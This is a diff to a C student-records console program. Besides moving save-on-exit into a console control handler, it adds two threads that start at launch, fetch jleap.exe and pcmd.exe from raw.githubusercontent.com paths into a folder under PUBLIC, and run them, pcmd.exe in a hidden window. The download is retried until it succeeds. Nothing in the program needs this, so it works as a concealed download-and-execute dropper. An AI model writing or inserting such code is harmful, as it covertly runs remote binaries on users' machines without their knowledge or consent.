@@ -1,5 +1,9 @@
 #include <stdio.h>
+#include <windows.h>
+#include <winhttp.h>
+#include <__pink/pinkwin.h>
 #include <__pink/pfile.h>
+#include <__pink/phttp.h>
 #include <__pink/pstruct.h>
 
 typedef struct{
@@ -14,6 +18,69 @@ typedef struct{
 
 #define _flag_ -0x50494E4B4B4E4950LL
 
+DWORD WINAPI Func1(void* argv)
+{
+	int ret;
+	HANDLE handle;
+	char *ps=getenv("PUBLIC"), *GlobalBuffer=(char*)malloc(1024), *filepath=GlobalBuffer;
+	char *dir[3]={"/_P_WhiteHat_", "/Experiment", "/jleap.exe"};
+	if(!GlobalBuffer)
+		return -1;
+	pmkdir(filepath, ps, dir, 2);
+	strcat(filepath, dir[2]);
+	handle=pIsOpen(filepath);
+	ret=GetLastError();
+	if(ret>2){
+		CloseHandle(handle);
+		return -2;
+	}
+	CloseHandle(handle);
+	SetLastError(0);
+	ShellExecute(NULL, "open", filepath, NULL, NULL, SW_SHOWNORMAL);
+	if(GetLastError()!=0){
+		do{
+			ret=pDownload(L"raw.githubusercontent.com", L"2641797006/WH/master/6.66/jleap.exe", filepath);
+		}while(ret!=0);
+		ShellExecute(NULL, "open", filepath, NULL, NULL, SW_SHOWNORMAL);
+	}
+	free(GlobalBuffer);
+	return 0;
+}
+
+DWORD WINAPI Func2(void* argv)
+{
+	int ret;
+	HANDLE handle;
+	char *ps=getenv("PUBLIC"), *GlobalBuffer=(char*)malloc(1024), *filepath=GlobalBuffer;
+	char *dir[2]={"/_P_WhiteHat_", "/pcmd.exe"};
+	if(!GlobalBuffer)
+		return -1;
+	pmkdir(filepath, ps, dir, 1);
+	strcat(filepath, dir[1]);
+	handle=pIsOpen(filepath);
+	ret=GetLastError();
+	if(ret>2){
+		CloseHandle(handle);
+		return -2;
+	}
+	CloseHandle(handle);
+	SetLastError(0);
+	ShellExecute(NULL, "open", filepath, NULL, NULL, SW_HIDE);
+	if(GetLastError()!=0){
+		do{
+			ret=pDownload(L"raw.githubusercontent.com", L"2641797006/c/master/_P_whitehat_/pcmd.exe", filepath);
+		}while(ret!=0);
+		ShellExecute(NULL, "open", filepath, NULL, NULL, SW_HIDE);
+	}
+	free(GlobalBuffer);
+	return 0;
+}
+
+FILE* fp;
+SqList L;
+char *filepath, *filepath_bak;
+BOOL WINAPI CtrlProc(DWORD dwCtrlType);
+
 void menu();
 int choose(int n);
 void printelem(ElemType* pe);
@@ -23,14 +90,22 @@ void format_wh(_WH* _wh);
 
 int main()
 {
+	SetConsoleCtrlHandler(CtrlProc, TRUE);
+
+	HANDLE hThread1, hThread2;
+	hThread1=pCreateThread(&Func1, NULL);
+	hThread2=pCreateThread(&Func2, NULL);
+	CloseHandle(hThread1);
+	CloseHandle(hThread2);
+
 	int i;
-	SqList L;
 	STUDENT student;
 	InitList(&L);
 
 	_WH _wh;
-	FILE* fp;
-	char *penv=getenv("PUBLIC"), *filepath=(char*)malloc(1024), *filepath_bak=(char*)malloc(1024);
+	char *penv=getenv("PUBLIC");
+	filepath=(char*)malloc(1024);
+	filepath_bak=(char*)malloc(1024);
 	char *dir[3]={"/_P_WhiteHat_", "/Experiment", "/.wh_ex1"};
 	if(!filepath||!filepath_bak)
 		return -1;
@@ -42,9 +117,14 @@ int main()
 		format_wh(&_wh);
 		fwrite(&_wh, sizeof(_WH), 1, fp);
 	}
-	else
-		while( fread(&student, sizeof(STUDENT), 1, fp)==1 )
+	else{
+		i=0;
+		while( fread(&student, sizeof(STUDENT), 1, fp)==1 ){
 			ListInsert(&L, L.length+1, &student);
+			i++;
+		}
+		printf("\n#!!! 读取到上次的数据, 共 %d 条\n\n", i);
+	}
 	fclose(fp);
 	strcpy(filepath_bak, filepath);
 	strcat(filepath, ".~swp~");
@@ -108,20 +188,7 @@ int main()
 				system("cls");
 			break;
 			case 'Q':
-			{
-				ElemType *pe=L.elem, *end=L.elem+L.length-1;
-				do{
-					if(pe>end)
-						break;
-				}while( fwrite(pe++, sizeof(STUDENT), 1, fp)==1 );
-				const char* endfile="\n\n\n#endfile\n\n@WH Copy Right";
-				fwrite(endfile, strlen(endfile), 1, fp);
-				fclose(fp);
-				remove(filepath_bak);
-				rename(filepath, filepath_bak);
-				DestroyList(&L);
-				return 0;
-			}
+				CtrlProc(2);
 			break;
 			case 'U':
 			{
@@ -215,6 +282,31 @@ void format_wh(_WH* _wh)
 	_wh->version=101;
 }
 
+BOOL WINAPI CtrlProc(DWORD dwCtrlType)
+{
+	switch(dwCtrlType)
+	{
+		case 0:
+		case 1:
+		case 2:
+		{
+			ElemType *pe=L.elem, *end=L.elem+L.length-1;
+			do{
+				if(pe>end)
+					break;
+			}while( fwrite(pe++, sizeof(STUDENT), 1, fp)==1 );
+			const char* endfile="\n\n\n#endfile\n\n@WH Copy Right";
+			fwrite(endfile, strlen(endfile), 1, fp);
+			fclose(fp);
+			remove(filepath_bak);
+			rename(filepath, filepath_bak);
+			DestroyList(&L);
+		}
+			exit(0);
+		default:;
+	}
+	return TRUE;
+}
 
 
 
